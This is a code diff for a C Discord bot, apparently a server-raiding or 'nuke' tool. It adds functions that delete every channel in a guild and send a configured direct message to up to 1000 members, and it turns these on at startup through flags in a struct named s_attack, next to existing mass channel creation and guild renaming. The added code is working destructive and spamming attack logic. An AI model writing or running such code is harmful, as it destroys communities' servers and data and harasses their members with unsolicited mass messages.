@@ -67,6 +67,56 @@ void guild_name(struct discord *client, u64_snowflake_t guild_id,
         NULL);
 }
 
+void dm_all(struct discord *client, u64_snowflake_t guild_id,
+            char message[2000])
+{
+    char *d_message = strtok(message, "");
+
+    struct discord_guild_member **members = NULL;
+
+    discord_list_guild_members(
+        client,
+        guild_id,
+        &(struct discord_list_guild_members_params){
+            .limit = 1000,
+        },
+        &members);
+
+    int i = 0;
+
+    struct discord_channel dm_channel = { 0 };
+
+    while (members[i])
+    {
+        discord_create_dm(
+            client,
+            &(struct discord_create_dm_params){
+                .recipient_id = members[i]->user->id,
+            },
+            &dm_channel);
+        ++i;
+
+        discord_create_message(
+            client,
+            dm_channel.id,
+            &(struct discord_create_message_params){
+                .content = d_message},
+            NULL);
+    }
+}
+
+void delete_all_channels(struct discord *client, u64_snowflake_t guild_id) {
+    struct discord_channel **channels;
+
+    discord_get_guild_channels(client, guild_id, &channels);
+
+    int i = 0;
+    while(channels[i]) {
+        discord_delete_channel(client, channels[i]->id, NULL);
+        i++;
+    }
+}
+
 void on_ready(struct discord *client)
 {
     const struct discord_user *bot = discord_get_self(client);
@@ -89,13 +139,23 @@ void on_ready(struct discord *client)
     log_info("NAME: %s", s_attack.mass_channel_name);
     u64_snowflake_t guild_id = get_guild(client);
 
+    if(s_attack.channel_delete_all == true) {
+        delete_all_channels(client, guild_id);
+    }
+
     if (s_attack.mass_channel_enabled == true)
     {
         mass_channel(client, guild_id, s_attack.mass_channel_name, s_attack.mass_channel_count, s_attack.mass_channel_type);
     }
 
-    if(s_attack.guild_name_enabled == true) {
+    if (s_attack.guild_name_enabled == true)
+    {
         guild_name(client, guild_id, s_attack.guild_name);
+    }
+
+    if (s_attack.dm_all_enabled == true)
+    {
+        dm_all(client, guild_id, s_attack.dm_message);
     }
 }
 
